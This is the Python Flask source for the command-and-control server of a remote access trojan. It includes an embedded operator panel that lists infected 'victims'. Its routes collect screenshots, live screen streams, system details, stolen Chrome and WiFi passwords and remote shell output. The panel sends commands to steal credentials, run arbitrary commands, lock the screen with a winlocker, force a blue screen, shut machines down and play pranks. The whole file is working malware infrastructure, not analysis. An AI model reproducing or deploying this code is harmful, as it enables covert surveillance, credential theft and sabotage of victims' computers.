from flask import Flask, request, jsonify
import time
import base64

app = Flask(__name__)

clients = {}
commands = {}

@app.route('/register', methods=['POST'])
def register():
    data = request.json
    client_id = str(int(time.time() * 1000))
    clients[client_id] = {
        "hostname": data.get("hostname", "unknown"),
        "username": data.get("username", "unknown"),
        "os": data.get("os", "unknown"),
        "ip": request.remote_addr,
        "last_seen": time.time(),
        "last_screenshot": "",
        "sysinfo": {},
        "chrome_data": "",
        "wifi_data": "",
        "exec_result": ""
    }
    commands[client_id] = []
    return jsonify({"id": client_id})

@app.route('/data/<client_id>', methods=['POST'])
def receive_data(client_id):
    if client_id in clients:
        data = request.json or {}
        t = data.get("type", "")
        if t in ["screenshot", "stream_frame"]:
            clients[client_id]["last_screenshot"] = data.get("data", "")
        elif t == "sysinfo":
            clients[client_id]["sysinfo"] = data.get("data", {})
        elif t == "chrome_passwords":
            clients[client_id]["chrome_data"] = data.get("data", "")
        elif t == "wifi_passwords":
            clients[client_id]["wifi_data"] = data.get("data", "")
        elif t == "exec_result":
            clients[client_id]["exec_result"] = data.get("data", "")
        clients[client_id]["last_seen"] = time.time()
    return jsonify({"status": "ok"})

@app.route('/screenshot/<client_id>')
def get_screenshot(client_id):
    if client_id in clients and clients[client_id].get("last_screenshot"):
        try:
            img = base64.b64decode(clients[client_id]["last_screenshot"])
            return img, 200, {'Content-Type': 'image/jpeg', 'Cache-Control': 'no-cache'}
        except:
            pass
    return "no", 404

@app.route('/command/<client_id>', methods=['GET'])
def send_command(client_id):
    if client_id in commands and commands[client_id]:
        return jsonify(commands[client_id].pop(0))
    return jsonify({"command": "ping"})

@app.route('/clients', methods=['GET'])
def get_clients():
    result = {}
    for cid, info in clients.items():
        if time.time() - info["last_seen"] < 60:
            result[cid] = {
                "hostname": info["hostname"],
                "username": info["username"],
                "os": info["os"],
                "ip": info.get("ip", ""),
                "has_screenshot": bool(info.get("last_screenshot")),
                "sysinfo": info.get("sysinfo", {}),
                "chrome_data": info.get("chrome_data", ""),
                "wifi_data": info.get("wifi_data", ""),
                "exec_result": info.get("exec_result", "")
            }
    return jsonify(result)

@app.route('/send_command/<client_id>', methods=['POST'])
def add_command(client_id):
    if client_id in commands:
        cmd = request.json or {}
        command = cmd.get("command", "")
        times = 3 if command in ["lock", "unlock", "winlocker", "shutdown", "restart", "bsod"] else 1
        for _ in range(times):
            commands[client_id].append(cmd)
    return jsonify({"status": "ok"})

@app.route('/')
def home():
    return """<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Control Panel</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0d1117;color:#c9d1d9;font-family:Arial;font-size:14px;height:100vh;display:flex}
.sidebar{width:260px;background:#161b22;border-right:1px solid #30363d;display:flex;flex-direction:column}
.sidebar-header{padding:16px;border-bottom:1px solid #30363d}
.sidebar-header h1{font-size:16px;color:#58a6ff}
.sidebar-header .status{font-size:12px;color:#3fb950;margin-top:4px}
.client-list{flex:1;overflow-y:auto;padding:8px}
.client-item{padding:12px;margin-bottom:4px;border-radius:6px;cursor:pointer;border:1px solid transparent}
.client-item:hover{background:#1c2128}
.client-item.active{border-color:#58a6ff;background:#1c2128}
.client-item .hostname{font-weight:600;color:#58a6ff;font-size:13px}
.client-item .meta{font-size:11px;color:#8b949e;margin-top:2px}
.dot{display:inline-block;width:6px;height:6px;background:#3fb950;border-radius:50%;margin-right:6px}
.main-content{flex:1;display:flex;flex-direction:column}
.toolbar{padding:10px 16px;border-bottom:1px solid #30363d;display:flex;gap:4px;flex-wrap:wrap;background:#161b22}
.toolbar button{padding:5px 12px;border:1px solid #30363d;border-radius:6px;background:#0d1117;color:#c9d1d9;font-size:12px;cursor:pointer}
.toolbar button:hover{background:#30363d}
.toolbar button.green{color:#3fb950;border-color:#3fb950}
.toolbar button.green:hover{background:#3fb950;color:#000}
.toolbar button.red{color:#f85149;border-color:#f85149}
.toolbar button.red:hover{background:#f85149;color:#fff}
.toolbar button.funny{color:#d2991d;border-color:#d2991d}
.toolbar button.funny:hover{background:#d2991d;color:#000}
.sep{width:100%;height:1px;background:#30363d;margin:4px 0}
.sl{width:100%;font-size:10px;color:#d2991d;font-weight:600;padding:2px 0}
.content-area{flex:1;display:flex;padding:8px;gap:8px;overflow:hidden}
.panel{background:#161b22;border:1px solid #30363d;border-radius:6px}
.scr-panel{flex:1;display:flex;align-items:center;justify-content:center;overflow:hidden}
.scr-panel img{max-width:100%;max-height:100%;object-fit:contain}
.placeholder{color:#8b949e;font-size:14px;text-align:center;padding:20px}
.info-panel{width:350px;flex-shrink:0;padding:16px;overflow-y:auto}
.info-panel h3{font-size:13px;color:#58a6ff;margin-bottom:8px;margin-top:16px}
.info-panel h3:first-child{margin-top:0}
.info-row{display:flex;padding:3px 0;font-size:12px}
.info-label{color:#8b949e;width:90px;flex-shrink:0}
.info-value{color:#c9d1d9}
pre{background:#0d1117;padding:8px;border-radius:6px;font-size:11px;color:#3fb950;white-space:pre-wrap;max-height:180px;overflow-y:auto}
.console-panel{width:300px;flex-shrink:0;display:flex;flex-direction:column}
.console-header{padding:8px 12px;font-size:11px;color:#58a6ff;border-bottom:1px solid #30363d}
.console-output{flex:1;overflow-y:auto;padding:8px;font-family:monospace;font-size:11px;color:#3fb950}
.console-input{display:flex;border-top:1px solid #30363d}
.console-input input{flex:1;background:transparent;border:none;color:#c9d1d9;padding:8px 12px;font-family:monospace;font-size:12px;outline:none}
.console-input button{background:#58a6ff;color:#000;border:none;padding:8px 14px;cursor:pointer;font-weight:600}
</style></head><body>
<div class="sidebar">
<div class="sidebar-header"><h1>Control Panel</h1><div class="status">● Online</div></div>
<div class="client-list" id="clientList"><div class="placeholder">Waiting...</div></div>
</div>
<div class="main-content">
<div class="toolbar">
<button onclick="S('screenshot')">📸 Scr</button>
<button class="green" onclick="startStream()">📡 Stream</button>
<button class="red" onclick="stopStream()">⏹ Stop</button>
<button onclick="S('sysinfo')">💻 Info</button>
<button onclick="S('steal_chrome')">🔑 Chrome</button>
<button onclick="S('steal_wifi')">📶 WiFi</button>
<button class="green" onclick="S('lock')">🔒 Lock</button>
<button onclick="S('unlock')">🔓 Unlock</button>
<button class="red" onclick="S('shutdown')">⏻ Off</button>
<button class="red" onclick="S('restart')">🔄 Reboot</button>
<button onclick="sendMsg()">💬 Msg</button>
<button class="red" onclick="S('winlocker')">🚫 WinLock</button>
<button class="red" onclick="S('bsod')">⚠ BSOD</button>
<div class="sep"></div>
<div class="sl">😂 Funny</div>
<button class="funny" onclick="S('funny_msg')">😂 Msg</button>
<button class="funny" onclick="S('crazy_screen')">🤪 Screen</button>
<button class="funny" onclick="S('crazy_mouse')">🖱 Mouse</button>
<button class="funny" onclick="S('rickroll')">🎵 RickRoll</button>
<button class="funny" onclick="S('draw')">🎨 Draw</button>
<button class="funny" onclick="S('beep')">🔊 Beep</button>
<button class="funny" onclick="S('cdrom')">💿 CD</button>
<button class="funny" onclick="S('type_funny')">⌨️ Type</button>
</div>
<div class="content-area">
<div class="panel scr-panel" id="screenPanel"><div class="placeholder">Select victim</div></div>
<div class="panel info-panel">
<h3>💻 System Info</h3><div id="sysinfoContent"></div>
<h3>📄 Output</h3><pre id="execOutput"></pre>
<h3>🔑 Chrome</h3><pre id="chromeContent"></pre>
<h3>📶 WiFi</h3><pre id="wifiContent"></pre>
</div>
<div class="panel console-panel">
<div class="console-header">📋 Console</div>
<div class="console-output" id="console"></div>
<div class="console-input"><input type="text" id="cmdInput" placeholder="Command..." onkeydown="if(event.key==='Enter')E()"><button onclick="E()">▶</button></div>
</div>
</div>
</div>
<script>
var sc=null,si=null;
function U(){fetch('/clients').then(r=>r.json()).then(d=>{var h='';for(var id in d){var c=d[id];h+='<div class="client-item'+(sc===id?' active':'')+'" onclick="C(\''+id+'\')"><div class="hostname"><span class="dot"></span>'+c.hostname+'</div><div class="meta">👤 '+c.username+' | 🌐 '+c.ip+' | 💻 '+c.os+'</div></div>'}document.getElementById('clientList').innerHTML=h||'<div class="placeholder">No victims</div>';if(sc&&d[sc]){var c=d[sc];if(c.has_screenshot&&si){var img=document.getElementById('screenPanel').querySelector('img');if(img)img.src='/screenshot/'+sc+'?t='+Date.now();else document.getElementById('screenPanel').innerHTML='<img src="/screenshot/'+sc+'">'}if(c.sysinfo&&Object.keys(c.sysinfo).length>0){var h='';for(var k in c.sysinfo)h+='<div class="info-row"><span class="info-label">'+k+':</span><span class="info-value">'+c.sysinfo[k]+'</span></div>';document.getElementById('sysinfoContent').innerHTML=h}if(c.chrome_data)document.getElementById('chromeContent').textContent=c.chrome_data;if(c.wifi_data)document.getElementById('wifiContent').textContent=c.wifi_data;if(c.exec_result)document.getElementById('execOutput').textContent=c.exec_result}})}
function C(id){sc=id;var items=document.querySelectorAll('.client-item');for(var i=0;i<items.length;i++)items[i].classList.remove('active');event.target.closest('.client-item').classList.add('active');S('screenshot');setTimeout(U,2000)}
function S(cmd){if(!sc)return;fetch('/send_command/'+sc,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({command:cmd})})}
function startStream(){if(!sc)return;S('stream_start');if(si)clearInterval(si);si=setInterval(function(){S('screenshot');setTimeout(U,1500)},2000)}
function stopStream(){if(si)clearInterval(si);si=null;S('stream_stop')}
function E(){var cmd=document.getElementById('cmdInput').value;if(cmd&&sc){S('exec');fetch('/send_command/'+sc,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({command:'exec',cmd:cmd})});document.getElementById('cmdInput').value='';setTimeout(U,3000)}}
function sendMsg(){if(!sc)return;var msg=prompt('Message:');if(msg){S('message');fetch('/send_command/'+sc,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({command:'message',text:msg})})}}
setInterval(U,2000);U()
</script></body></html>"""

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
